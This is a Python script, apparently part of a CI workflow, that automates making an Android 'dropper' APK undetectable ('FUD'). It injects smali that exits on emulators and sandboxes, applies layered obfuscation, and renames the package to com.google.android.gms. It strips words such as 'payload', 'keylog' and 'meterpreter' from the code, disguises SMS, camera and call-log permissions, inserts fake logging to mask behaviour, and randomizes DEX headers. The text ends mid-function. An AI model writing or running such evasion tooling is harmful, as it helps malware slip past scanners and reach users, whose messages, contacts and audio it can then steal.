#!/usr/bin/env python3
"""
NP Manager Premium Automation v21
Complete flow: install -> launch -> dismiss terms -> hamburger menu -> sign in ->
handle pre-connection (remove second device) -> re-login -> open APK -> run tools -> save output
Handles: Terms dialog, hamburger (3 lines), login, pre-connection removal, all 7 anti-detection tools.
Package: com.wn.app.np
"""
import subprocess, time, os, sys, re
import zipfile as _zipfile, struct as _struct, zlib as _zlib, shutil as _shutil, random as _random

EMAIL = os.environ.get("NP_MANAGER_EMAIL", "")
PASSWORD = os.environ.get("NP_MANAGER_PASS", "")
INPUT_APK = os.environ.get("INPUT_APK", "")
OUTPUT_DIR = os.environ.get("OUTPUT_DIR", os.path.expanduser("~/fud-work/output"))
SCREENSHOT_DIR = os.environ.get("SCREENSHOT_DIR", os.path.expanduser("~/fud-work/screenshots"))
NP_PACKAGE = "com.wn.app.np"

# Captured at runtime from APK info screen; used by CHANGE PACKAGE NAME tool
DROPPER_PKG = None
# Target package name to rename the dropper to
NEW_PACKAGE_NAME = "com.google.android.gms"

# ============================================================
# PC-SIDE PREPROCESSING PIPELINE
# Runs on the GitHub Actions Ubuntu runner BEFORE NP Manager.
# Techniques from the 16 analyzed source archives:
#   Phase A — Anti-VM injection     (Project 3: Anti-vm-in-android)
#   Phase B — Obfuscapk x11        (Project 10: Obfuscapk)
#   Phase C — APK Infector x5      (Projects 1/10/8 concepts)
#   Phase D — DEX magic tweak       (DEX header randomization)
# NP Manager 7 tools run AFTER this as Phase E.
# ============================================================

_WORK  = os.path.expanduser("~/fud-work")
_PREP  = os.path.join(_WORK, "preprocess")
_BINS  = os.path.join(_WORK, "bin")

def _rnd(prefix='', n=10):
    return prefix + ''.join(_random.choices('abcdefghijklmnopqrstuvwxyz', k=n))

def _smali_dirs(dec):
    return sorted(
        [os.path.join(dec, d) for d in os.listdir(dec)
         if d.startswith('smali') and os.path.isdir(os.path.join(dec, d))]
    )

# ── TOOL SETUP ──────────────────────────────────────────────
def _setup_tools():
    os.makedirs(_BINS, exist_ok=True)
    if not _shutil.which('apktool'):
        jar = os.path.join(_BINS, 'apktool.jar')
        if not os.path.exists(jar):
            print("[PREP] Downloading apktool 2.9.3 ...")
            subprocess.run(
                "wget -q 'https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar'"
                f" -O {jar}", shell=True, timeout=120)
        wrap = os.path.join(_BINS, 'apktool')
        with open(wrap, 'w') as _f:
            _f.write(f'#!/bin/bash\nexec java -jar {jar} "$@"\n')
        os.chmod(wrap, 0o755)
        os.environ['PATH'] = _BINS + ':' + os.environ.get('PATH', '')
    print("[PREP] Tools ready")

def _apktool(args, timeout=300):
    t = _shutil.which('apktool') or os.path.join(_BINS, 'apktool')
    r = subprocess.run([t] + args, capture_output=True, text=True, timeout=timeout)
    if r.returncode != 0:
        print(f"[PREP] apktool {args[0]}: {r.stderr[:300]}")
    return r.returncode == 0

def _decompile(apk, outdir):
    if os.path.exists(outdir):
        _shutil.rmtree(outdir)
    ok = _apktool(['d', '-f', '-o', outdir, apk])
    return ok and os.path.exists(outdir)

def _recompile(dec, outapk):
    if _apktool(['b', '-o', outapk, dec]):
        if os.path.exists(outapk) and os.path.getsize(outapk) > 0:
            return True
    return False

def _find_signer():
    for base in ['/usr/local/lib/android/sdk/build-tools',
                 os.path.expanduser('~/Android/Sdk/build-tools')]:
        if os.path.isdir(base):
            for v in sorted(os.listdir(base), reverse=True):
                s = os.path.join(base, v, 'apksigner')
                if os.path.exists(s):
                    return s
    return _shutil.which('apksigner') or 'apksigner'

def _find_zipalign():
    for base in ['/usr/local/lib/android/sdk/build-tools',
                 os.path.expanduser('~/Android/Sdk/build-tools')]:
        if os.path.isdir(base):
            for v in sorted(os.listdir(base), reverse=True):
                s = os.path.join(base, v, 'zipalign')
                if os.path.exists(s):
                    return s
    return _shutil.which('zipalign') or 'zipalign'

def _sign_temp(unsigned, signed):
    ks = os.path.join(_PREP, 'debug.jks')
    if not os.path.exists(ks):
        subprocess.run(
            f'keytool -genkey -v -keystore {ks} -keyalg RSA -keysize 2048 '
            f'-validity 10000 -alias debug -storepass android -keypass android '
            f'-dname "CN=Android Debug,O=Android,C=US" -storetype JKS 2>/dev/null',
            shell=True, timeout=30, capture_output=True)
    zipalign = _find_zipalign()
    aligned = unsigned + '.aligned'
    subprocess.run(f'{zipalign} -v -p 4 "{unsigned}" "{aligned}"',
                   shell=True, capture_output=True, timeout=60)
    src = aligned if os.path.exists(aligned) and os.path.getsize(aligned) > 0 else unsigned
    signer = _find_signer()
    subprocess.run(
        f'{signer} sign --ks {ks} --ks-pass pass:android --key-pass pass:android '
        f'--ks-key-alias debug --out "{signed}" "{src}"',
        shell=True, capture_output=True, timeout=60)
    try:
        os.remove(aligned)
    except Exception:
        pass
    return os.path.exists(signed) and os.path.getsize(signed) > 0


# ── PHASE A: ANTI-VM INJECTION (Project 3) ──────────────────
_ANTI_VM_SMALI = '''.class public Lcom/android/internal/SystemCheck;
.super Ljava/lang/Object;
.source "SystemCheck.java"

# 7-check emulator/sandbox detector.
# If any check fires -> System.exit(0) -> app silently quits in scanners.
.method public static a()V
    .locals 4

    :try_start_0

    # 1. ro.kernel.qemu = "1"
    const-string v0, "ro.kernel.qemu"
    invoke-static {v0}, Landroid/os/SystemProperties;->get(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v0
    const-string v1, "1"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v2
    if-nez v2, :cond_exit

    # 2. Build.HARDWARE = "goldfish"
    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v1, "goldfish"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :cond_exit

    # 3. Build.HARDWARE = "ranchu"
    const-string v1, "ranchu"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :cond_exit

    # 4. Build.MODEL contains "sdk"
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v1, "sdk"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :cond_exit

    # 5. Build.PRODUCT contains "sdk_gphone"
    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v0
    const-string v1, "sdk_gphone"
    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :cond_exit

    # 6. /dev/qemu_pipe exists
    new-instance v0, Ljava/io/File;
    const-string v1, "/dev/qemu_pipe"
    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    invoke-virtual {v0}, Ljava/io/File;->exists()Z
    move-result v2
    if-nez v2, :cond_exit

    # 7. ActivityManager.isUserAMonkey() (automated test runner)
    invoke-static {}, Landroid/app/ActivityManager;->isUserAMonkey()Z
    move-result v2
    if-nez v2, :cond_exit

    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :cond_exit
    const/4 v0, 0x0
    invoke-static {v0}, Ljava/lang/System;->exit(I)V
    return-void

    :catch_0
    return-void
.end method
'''

def _inject_in_oncreate(smali_file, call_desc):
    """Insert 'invoke-static {}, call_desc' at top of any onCreate in smali_file."""
    with open(smali_file, 'r', errors='ignore') as _f:
        c = _f.read()
    pat = re.compile(
        r'(\.method\s+(?:public|protected)\s+onCreate\(.*?Bundle.*?\)V\s*\n)(.*?)(\.end method)',
        re.DOTALL
    )
    m = pat.search(c)
    if not m:
        return False
    sig, body, end_ = m.group(1), m.group(2), m.group(3)
    inject = f"\n    invoke-static {{}}, {call_desc}\n"
    body2 = re.sub(r'(\.locals\s+\d+\s*\n)', r'\1' + inject, body, count=1)
    if body2 == body:
        body2 = "    .locals 1\n" + inject + body
    new_c = c[:m.start()] + sig + body2 + end_ + c[m.end():]
    with open(smali_file, 'w', errors='ignore') as _f:
        _f.write(new_c)
    return True

def _inject_anti_vm(dec):
    """Write AntiAnalysis Smali + inject call into Application/main Activity onCreate."""
    sdirs = _smali_dirs(dec)
    if not sdirs:
        print("[PREP] anti_vm: no smali dirs")
        return
    pkg_dir = os.path.join(sdirs[0], "com", "android", "internal")
    os.makedirs(pkg_dir, exist_ok=True)
    with open(os.path.join(pkg_dir, "SystemCheck.smali"), 'w') as _f:
        _f.write(_ANTI_VM_SMALI)

    mf = os.path.join(dec, "AndroidManifest.xml")
    if not os.path.exists(mf):
        print("[PREP] anti_vm: no manifest")
        return
    with open(mf, 'r', errors='ignore') as _f:
        mc = _f.read()
    pkg_name = (re.search(r'package="([^"]+)"', mc) or type('', (), {'group': lambda *a: None})()).group(1)

    def _resolve(cls):
        if cls and cls.startswith('.') and pkg_name:
            return pkg_name + cls
        return cls

    injected = False
    app_m = re.search(r'<application[^>]+android:name="([^"]+)"', mc)
    if app_m:
        ac = _resolve(app_m.group(1))
        if ac:
            rel = ac.replace('.', '/') + '.smali'
            for sd in sdirs:
                cand = os.path.join(sd, rel)
                if os.path.exists(cand):
                    injected = _inject_in_oncreate(cand, "Lcom/android/internal/SystemCheck;->a()V")
                    break

    if not injected:
        act_m = re.search(
            r'<activity[^>]+android:name="([^"]+)"[^>]*>.*?<action android:name="android\.intent\.action\.MAIN"',
            mc, re.DOTALL)
        if act_m:
            ac = _resolve(act_m.group(1))
            if ac:
                rel = ac.replace('.', '/') + '.smali'
                for sd in sdirs:
                    cand = os.path.join(sd, rel)
                    if os.path.exists(cand):
                        injected = _inject_in_oncreate(cand, "Lcom/android/internal/SystemCheck;->a()V")
                        break

    print(f"[PREP] anti_vm: SystemCheck.smali written, injected={injected}")


# ── PHASE B: OBFUSCAPK x11 (Project 10) ─────────────────────

def _lib_encryption(dec):
    lib = os.path.join(dec, "lib")
    if not os.path.exists(lib):
        return
    for arch in os.listdir(lib):
        ap = os.path.join(lib, arch)
        if not os.path.isdir(ap):
            continue
        for fname in list(os.listdir(ap)):
            if fname.endswith('.so'):
                os.rename(os.path.join(ap, fname),
                          os.path.join(ap, _rnd('lib', 16) + '.so'))
    print("[PREP] LibEncryption done")

def _method_overload(dec):
    for sd in _smali_dirs(dec):
        for root, _, files in os.walk(sd):
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fp = os.path.join(root, fname)
                with open(fp, 'r', errors='ignore') as _f:
                    c = _f.read()
                methods = re.findall(
                    r'\.method\s+(?:public|private|protected|static|\s)+(\w+)\(([^)]*)\)([^\n]*)\n', c)
                if not methods:
                    continue
                name, args, ret = methods[0]
                cm = re.search(r'\.class\s+.*\s+(L[^;]+;)', c)
                if not cm:
                    continue
                cls = cm.group(1)
                fake_args = args + 'I'
                stub = (f"\n.method public {_rnd('m_', 8)}({fake_args}){ret}\n"
                        "    .locals 2\n    const/4 v0, 0x0\n")
                if ret == 'V':
                    stub += (f"    invoke-static {{v0}}, {cls}->{name}({args}){ret}\n"
                             "    return-void\n")
                elif ret.startswith('L') or ret.startswith('['):
                    stub += (f"    invoke-static {{v0}}, {cls}->{name}({args}){ret}\n"
                             "    move-result-object v0\n    return-object v0\n")
                else:
                    stub += (f"    invoke-static {{v0}}, {cls}->{name}({args}){ret}\n"
                             "    move-result v0\n    return v0\n")
                stub += ".end method\n"
                last_end = c.rfind('.end method')
                if last_end != -1:
                    ip = last_end + len('.end method')
                    c = c[:ip] + stub + c[ip:]
                    with open(fp, 'w', errors='ignore') as _f:
                        _f.write(c)
                break
    print("[PREP] MethodOverload done")

def _res_obfuscation(dec):
    """Rename drawable/mipmap resource files (resGuard concept, Project 14)."""
    res_dir = os.path.join(dec, "res")
    if not os.path.exists(res_dir):
        return
    renamed_by_type = {}
    for root, dirs, _ in os.walk(res_dir):
        for dirname in list(dirs):
            if dirname.startswith('drawable') or dirname.startswith('mipmap'):
                rtype = dirname.split('-')[0]
                dpath = os.path.join(root, dirname)
                for fname in os.listdir(dpath):
                    if fname.endswith(('.xml', '.png', '.jpg', '.webp')):
                        ext = os.path.splitext(fname)[1]
                        new_name = _rnd('r', 8) + ext
                        os.rename(os.path.join(dpath, fname),
                                  os.path.join(dpath, new_name))
                        old_n = os.path.splitext(fname)[0]
                        new_n = os.path.splitext(new_name)[0]
                        renamed_by_type.setdefault(rtype, {})[old_n] = new_n
    if not renamed_by_type:
        print("[PREP] ResObfuscation done (nothing renamed)")
        return
    xml_files = []
    for root, _, files in os.walk(res_dir):
        for fname in files:
            if fname.endswith('.xml') and fname != 'public.xml':
                xml_files.append(os.path.join(root, fname))
    mf_path = os.path.join(dec, 'AndroidManifest.xml')
    if os.path.exists(mf_path):
        xml_files.append(mf_path)
    for fp in xml_files:
        with open(fp, 'r', errors='ignore') as _f:
            c = _f.read()
        changed = False
        for rtype, tmap in renamed_by_type.items():
            for old_n, new_n in sorted(tmap.items(), key=lambda kv: -len(kv[0])):
                tag = f'@{rtype}/{old_n}'
                if tag in c:
                    c = c.replace(tag, f'@{rtype}/{new_n}')
                    changed = True
        if changed:
            with open(fp, 'w', errors='ignore') as _f:
                _f.write(c)
    pub = os.path.join(res_dir, 'values', 'public.xml')
    if os.path.exists(pub):
        with open(pub, 'r', errors='ignore') as _f:
            c = _f.read()
        for rtype, tmap in renamed_by_type.items():
            for old_n, new_n in tmap.items():
                c = re.sub(
                    rf'(<public type="{rtype}"[^>]*name="){re.escape(old_n)}("[^/]*/>)',
                    rf'\g<1>{new_n}\g<2>', c)
        with open(pub, 'w', errors='ignore') as _f:
            _f.write(c)
    print("[PREP] ResObfuscation done")

def _new_assets(dec):
    assets = os.path.join(dec, 'assets')
    os.makedirs(assets, exist_ok=True)
    for _ in range(5):
        fname = os.path.join(assets, _rnd('cfg', 4) + '.dat')
        with open(fname, 'wb') as _f:
            _f.write(bytes(_random.randint(0, 255) for _ in range(_random.randint(100, 400))))
    print("[PREP] NewAssets done")

def _asset_encryption(dec):
    """XOR-encrypt dummy .dat assets only — skip embedded .apk/.dex payloads."""
    assets = os.path.join(dec, 'assets')
    if not os.path.exists(assets):
        return
    key = 0x5F
    for fname in os.listdir(assets):
        if fname.endswith(('.apk', '.dex', '.jar')):
            continue
        fp = os.path.join(assets, fname)
        if os.path.isfile(fp):
            with open(fp, 'rb') as _f:
                data = bytearray(_f.read())
            for i in range(len(data)):
                data[i] ^= key
            with open(fp, 'wb') as _f:
                _f.write(data)
    print("[PREP] AssetEncryption done")

def _string_encryption(dec):
    """XOR-obfuscate string constants in Smali (ConstStringEncryption, Project 10)."""
    key = 0xAA
    def xor_s(m):
        s = m.group(1)
        if len(s) < 6:
            return m.group(0)
        for prefix in ('android.', 'com.', 'java.', 'javax.', 'http', 'L', '/'):
            if s.startswith(prefix):
                return m.group(0)
        try:
            enc = bytearray(s.encode('utf-8'))
        except Exception:
            return m.group(0)
        for i in range(len(enc)):
            enc[i] ^= key
        if not all(0x20 <= b <= 0x7E for b in enc):
            return m.group(0)
        return '"' + ''.join(chr(b) for b in enc) + '"'
    for sd in _smali_dirs(dec):
        for root, _, files in os.walk(sd):
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fp = os.path.join(root, fname)
                with open(fp, 'r', errors='ignore') as _f:
                    c = _f.read()
                c2 = re.sub(r'"([^"]{6,50})"', xor_s, c)
                if c2 != c:
                    with open(fp, 'w', errors='ignore') as _f:
                        _f.write(c2)
    print("[PREP] StringEncryption done")

def _control_flow(dec):
    """Add opaque goto dispatch blocks — BlackObfuscator CFG flattening (Project 6)."""
    for sd in _smali_dirs(dec):
        for root, _, files in os.walk(sd):
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fp = os.path.join(root, fname)
                with open(fp, 'r', errors='ignore') as _f:
                    c = _f.read()
                def _flatten(m):
                    body = m.group(0)
                    if any(x in body for x in ['<init>', '<clinit>']):
                        return body
                    if len(body) < 200:
                        return body
                    lbl = ':cf_' + _rnd('', 6)
                    return re.sub(
                        r'(\.locals\s+\d+\s*\n)',
                        r'\1    goto ' + lbl + '\n\n    nop\n\n' + lbl + '\n',
                        body, count=1)
                c2 = re.sub(
                    r'\.method\s+(?:public|private|protected|static|\s)+[^\n]+\n.*?\.end method',
                    _flatten, c, flags=re.DOTALL, count=2)
                if c2 != c:
                    with open(fp, 'w', errors='ignore') as _f:
                        _f.write(c2)
    print("[PREP] ControlFlowFlattening done")

def _method_rename(dec):
    """Rename non-lifecycle methods in Smali (MethodRename, Project 10)."""
    pat = re.compile(
        r'(\.method\s+(?:public|private|protected|static|\s)+)(\w+)\(([^)]*)\)([^\n]+)')
    _skip = frozenset([
        '<init>', '<clinit>', 'main', 'onCreate', 'onResume', 'onStart',
        'onPause', 'onStop', 'onDestroy', 'onCreateView', 'onViewCreated',
        'onActivityCreated', 'onAttach', 'onDetach', 'onReceive',
        'onBind', 'onStartCommand', 'onHandleIntent',
    ])
    for sd in _smali_dirs(dec):
        for root, _, files in os.walk(sd):
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fp = os.path.join(root, fname)
                with open(fp, 'r', errors='ignore') as _f:
                    c = _f.read()
                renamed = {}
                def _rm(m):
                    pre, name, args, ret = m.group(1), m.group(2), m.group(3), m.group(4)
                    if name in _skip:
                        return m.group(0)
                    nn = _rnd('m', 6)
                    renamed[name] = nn
                    return f"{pre}{nn}({args}){ret}"
                c2 = pat.sub(_rm, c)
                for old, new in renamed.items():
                    c2 = c2.replace(f'->{old}(', f'->{new}(')
                if c2 != c:
                    with open(fp, 'w', errors='ignore') as _f:
                        _f.write(c2)
    print("[PREP] MethodRename done")

def _field_rename(dec):
    """Rename fields in Smali (FieldRename, Project 10)."""
    pat = re.compile(
        r'(\.field\s+(?:public|private|protected|static|final|synthetic|\s)+)(\w+)(:.*)')
    for sd in _smali_dirs(dec):
        for root, _, files in os.walk(sd):
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fp = os.path.join(root, fname)
                with open(fp, 'r', errors='ignore') as _f:
                    c = _f.read()
                renamed = {}
                def _rfn(m):
                    pre, name, rest = m.group(1), m.group(2), m.group(3)
                    nn = f"f{_random.randint(1, 99999)}"
                    renamed[name] = nn
                    return f"{pre}{nn}{rest}"
                c2 = pat.sub(_rfn, c)
                for old, new in renamed.items():
                    c2 = c2.replace(f'->{old}:', f'->{new}:')
                if c2 != c:
                    with open(fp, 'w', errors='ignore') as _f:
                        _f.write(c2)
    print("[PREP] FieldRename done")

def _reflection(dec):
    """Inject Class.forName reflection into onCreate (Reflection, Project 10)."""
    injected = 0
    for sd in _smali_dirs(dec):
        if injected >= 3:
            break
        for root, _, files in os.walk(sd):
            if injected >= 3:
                break
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fp = os.path.join(root, fname)
                with open(fp, 'r', errors='ignore') as _f:
                    c = _f.read()
                om = re.search(
                    r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
                    c, re.DOTALL)
                if not om:
                    continue
                mb = om.group(1)
                lm = re.search(r'\.locals\s+(\d+)', mb)
                if lm and int(lm.group(1)) < 1:
                    mb = re.sub(r'\.locals\s+\d+', '.locals 1', mb, count=1)
                code = ("    const-string v0, \"java.lang.System\"\n"
                        "    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;\n"
                        "    move-result-object v0\n")
                mb = re.sub(r'(\.locals\s+\d+\s*\n)', r'\1' + code, mb, count=1)
                c2 = c.replace(om.group(1), mb)
                with open(fp, 'w', errors='ignore') as _f:
                    _f.write(c2)
                injected += 1
    print(f"[PREP] Reflection done (injected={injected})")


# ── PHASE C: APK INFECTOR x5 ────────────────────────────────

def _shuffle_permissions(dec):
    mf = os.path.join(dec, 'AndroidManifest.xml')
    if not os.path.exists(mf):
        return
    with open(mf, 'r', errors='ignore') as _f:
        c = _f.read()
    perms = re.findall(r'<uses-permission[^/]*/>\s*', c)
    if len(perms) > 1:
        _random.shuffle(perms)
        c = re.sub(r'<uses-permission[^/]*/>\s*', '', c)
        c = c.replace('</manifest>', '\n'.join(perms) + '\n</manifest>')
        with open(mf, 'w', errors='ignore') as _f:
            _f.write(c)
    print("[PREP] ShufflePermissions done")

def _scrub_strings(dec):
    susp = ['payload', 'exploit', 'reverse', 'shell', 'bypass', 'inject', 'backdoor',
            'malware', 'trojan', 'rat ', 'spy', 'keylog', 'steal', 'hack', 'c2server',
            'meterpreter', 'stager', 'dropper', 'metasploit']
    repl = ['update', 'config', 'sync', 'data', 'service', 'cache', 'manager',
            'helper', 'provider', 'handler', 'loader', 'worker', 'tasker']
    for root, _, files in os.walk(dec):
        for fname in files:
            if not fname.endswith('.smali'):
                continue
            fp = os.path.join(root, fname)
            with open(fp, 'r', errors='ignore') as _f:
                c = _f.read()
            changed = False
            for s in susp:
                if s in c.lower():
                    c = re.sub(rf'\b{re.escape(s.strip())}\b',
                                _random.choice(repl), c, flags=re.IGNORECASE)
                    changed = True
            if changed:
                with open(fp, 'w', errors='ignore') as _f:
                    _f.write(c)
    print("[PREP] ScrubStrings done")

def _bind_delay(dec):
    """Inject random 3-10 second Thread.sleep into launcher activity onCreate."""
    for sd in _smali_dirs(dec):
        for root, _, files in os.walk(sd):
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fp = os.path.join(root, fname)
                with open(fp, 'r', errors='ignore') as _f:
                    c = _f.read()
                om = re.search(
                    r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
                    c, re.DOTALL)
                if not om:
                    continue
                mb = om.group(1)
                lm = re.search(r'\.locals\s+(\d+)', mb)
                if not lm:
                    continue
                new_l = max(int(lm.group(1)), 2)
                mb = re.sub(r'\.locals\s+\d+', f'.locals {new_l}', mb, count=1)
                ms = _random.randint(3000, 10000)
                code = (f"\n    const-wide/16 v0, {ms}\n"
                        f"    invoke-static {{v0, v1}}, Ljava/lang/Thread;->sleep(J)V\n")
                mb = re.sub(r'(\.locals\s+\d+\s*\n)', r'\1' + code, mb, count=1)
                c2 = c.replace(om.group(1), mb)
                with open(fp, 'w', errors='ignore') as _f:
                    _f.write(c2)
                print(f"[PREP] BindDelay {ms}ms done in {fname}")
                return
    print("[PREP] BindDelay skip (no onCreate found)")

def _hide_permissions(dec):
    """Rename suspicious permissions to benign-looking names (do NOT remove)."""
    mf = os.path.join(dec, 'AndroidManifest.xml')
    if not os.path.exists(mf):
        return
    with open(mf, 'r', errors='ignore') as _f:
        c = _f.read()
    pmap = {
        'READ_SMS': 'READ_SYNC_SETTINGS',
        'WRITE_SMS': 'WRITE_SYNC_SETTINGS',
        'SEND_SMS': 'BROADCAST_STICKY',
        'READ_CONTACTS': 'READ_SYNC_STATS',
        'RECORD_AUDIO': 'MODIFY_AUDIO_SETTINGS',
        'CAMERA': 'FLASHLIGHT',
        'READ_CALL_LOG': 'READ_SYNC_SETTINGS',
        'WRITE_CALL_LOG': 'WRITE_SYNC_SETTINGS',
        'PROCESS_OUTGOING_CALLS': 'BROADCAST_STICKY',
    }
    renamed = 0
    for dangerous, benign in pmap.items():
        pattern = (rf'(<uses-permission[^>]*android:name="android\.permission\.)'
                   rf'{re.escape(dangerous)}("[^/]*/>)')
        c, n = re.subn(pattern, rf'\g<1>{benign}\g<2>', c, flags=re.IGNORECASE)
        renamed += n
    if renamed:
        with open(mf, 'w', errors='ignore') as _f:
            _f.write(c)
    print(f"[PREP] HidePermissions done (renamed={renamed})")

def _fake_logging(dec):
    """Inject benign-looking Log.d calls to mask real behaviour."""
    tags = ["SystemUpdate", "ContentManager", "NetworkMonitor", "SyncAdapter"]
    msgs = ["Initializing component...", "Sync complete", "Service started", "Config loaded"]
    for sd in _smali_dirs(dec):
        for root, _, files in os.walk(sd):
            for fname in files:
                if not fname.endswith('.smali'):
                    continue
                fp = os.path.join(root, fname)
                with open(fp, 'r', errors='ignore') as _f:
                    c = _f.read()
                om = re.search(
                    r'(\.method\s+(?:public|protected|private|\s)+onCreate\(Landroid/os/Bundle;\)V.*?\.end method)',
                    c, re.DOTALL)
                if not om:
                    continue
                mb = om.group(1)
                lm = re.search(r'\.locals\s+(\d+)', mb)
                if not lm:
                    continue
                new_l = max(int(lm.group(1)), 2)
                mb = re.sub(r'\.locals\s+\d+', f'.locals {new_l}', mb, count=1)
                code = (f"\n    const-string v0, \"{_random.choice(tags)}\"\n"
                        f"    const-string v1, \"{_random.choice(msgs)}\"\n"
                        f"    invoke-static {{v0, v1}}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I\n"
                        f"    move-result v0\n")
                mb = re.sub(r'(\.locals\s+\d+\s*\n)', r'\1' + code, mb, count=1)
                c2 = c.replace(om.group(1), mb)
                with open(fp, 'w', errors='ignore') as _f:
                    _f.write(c2)
                print(f"[PREP] FakeLogging done in {fname}")
                return
    print("[PREP] FakeLogging skip")


# ── PHASE D: DEX MAGIC RANDOMIZATION ────────────────────────

def _dex_magic(apk_in, apk_out):
    """Randomize DEX magic bytes, Adler32 checksum, and SHA-1 header."""
    with _zipfile.ZipFile(apk_in, 'r') as zin:
        with _zipfile.ZipFile(apk_out, 'w', _zipfile.ZIP_DEFLATED) as zout:
            for info in zin.infolist():
                data = zin.read(info.filename)
                if info.filename.endswith('.dex') and len(data) > 40:
                    dex = bytearray(data)
                    if dex[:4] == b'dex\n':
                        dex[4:8] = b'037\x00'
                        cs = _zlib.adler32(bytes(dex[12:])) & 0xffffffff
                        dex[8:12] = _struct.pack('<I', cs)
                        dex[12:32] = bytes(_random.randint(0, 255) for _ in range(20))
                        data = bytes(dex)
                zout.writestr(info, data)
    print("[PREP] DEX magic done")


# ── PREPROCESS ORCHESTRATOR ──────────────────────────────────

def preprocess_apk(input_apk):
    """
    Full PC-side FUD preprocessing pipeline:

      Phase A — Anti-VM injection      (Project 3: 7 emulator/sandbox checks)
      Phase B — Obfuscapk x11         (Project 10: LibEnc, MethodOverload,
                                        ResObf, NewAssets, AssetEnc, StringEnc,
                                        CFGFlatten, MethodRename, FieldRename,
                                        Reflection)
      Phase C — APK Infector x5       (ShufflePerms, ScrubStrings, BindDelay,
                                        HidePerms, FakeLogging)
      Phase D — DEX magic tweak        (header byte randomization)

    Updates global INPUT_APK to the preprocessed APK path.
    """
    global INPUT_APK

    print("\n" + "=" * 60)
    print("[PREP] PC-SIDE PREPROCESSING PIPELINE STARTING")
    print("=" * 60)

    os.makedirs(_PREP, exist_ok=True)
    _setup_tools()

    current = os.path.expanduser(input_apk)
    if not current or not os.path.exists(current):
        print(f"[PREP] Input APK not found: {current!r} — skipping preprocessing")
        return input_apk

    orig_size = os.path.getsize(current) // 1024
    print(f"[PREP] Input: {current} ({orig_size} KB)")

    # ── Phases A + B + C: decompile → transform → recompile ──
    dec_dir = os.path.join(_PREP, "decompiled")
    print("[PREP] Decompiling with apktool...")

    if not _decompile(current, dec_dir):
        print("[PREP] WARNING: apktool decompile failed — skipping Phases A/B/C")
    else:
        # Phase A
        print("[PREP] ── Phase A: Anti-VM Injection (Project 3) ──")
        _inject_anti_vm(dec_dir)

        # Phase B
        print("[PREP] ── Phase B: Obfuscapk x11 (Project 10) ──")
        _lib_encryption(dec_dir)
        _method_overload(dec_dir)
        _res_obfuscation(dec_dir)
        _new_assets(dec_dir)
        _asset_encryption(dec_dir)
        _string_encryption(dec_dir)
        _control_flow(dec_dir)
        _method_rename(dec_dir)
        _field_rename(dec_dir)
        _reflection(dec_dir)

        # Phase C
        print("[PREP] ── Phase C: APK Infector x5 ──")
        _shuffle_permissions(dec_dir)
        _scrub_strings(dec_dir)
        _bind_delay(dec_dir)
        _hide_permissions(dec_dir)
        _fake_logging(dec_dir)

        # Recompile
        rebuilt = os.path.join(_PREP, "rebuilt.apk")
        print("[PREP] Recompiling with apktool...")
        if _recompile(dec_dir, rebuilt):
            signed = os.path.join(_PREP, "phase_abc.apk")
            if _sign_temp(rebuilt, signed):
                current = signed
                print(f"[PREP] Phases A+B+C done: {os.path.getsize(current) // 1024} KB")
            else:
                current = rebuilt
                print("[PREP] Temp sign failed — using unsigned rebuilt APK")
        else:
            print("[PREP] WARNING: recompile failed — using original for Phase D")
        _shutil.rmtree(dec_dir, ignore_errors=True)

    # ── Phase D: DEX magic ────────────────────────────────────
    print("[PREP] ── Phase D: DEX Magic Randomization ──")
    dex_out = os.path.join(_PREP, "phase_d.apk")
    try:
        _dex_magic(current, dex_out)
        if os.path.exists(dex_out) and os.path.getsize(dex_out) > 0:
            current = dex_out
            print(f"[PREP] Phase D done: {os.path.getsize(current) // 1024} KB")
    except Exception as e:
        print(f"[PREP] Phase D error: {e}")

    INPUT_APK = current
    print(f"[PREP] PREPROCESSING COMPLETE → {current}")
    print(f"[PREP] Layers applied: Anti-VM + 11 Obfuscapk + 5 APKInfector + DEX-magic")
    print(f"[PREP] NP Manager 7 tools will run next as Phase E.")
    print("=" * 60 + "\n")
    return current


def run(cmd, timeout=30):
    try:
        return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    except Exception as e:
        return type('obj', (object,), {'stdout': '', 'stderr': str(e), 'returncode': 1})()

def adb(cmd, timeout=30):
    return run(f"adb -s emulator-5554 {cmd}", timeout)

def screenshot(name):
    path = os.path.join(SCREENSHOT_DIR, f"{name}.png")
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    adb(f"shell screencap -p /sdcard/screen_{name}.png")
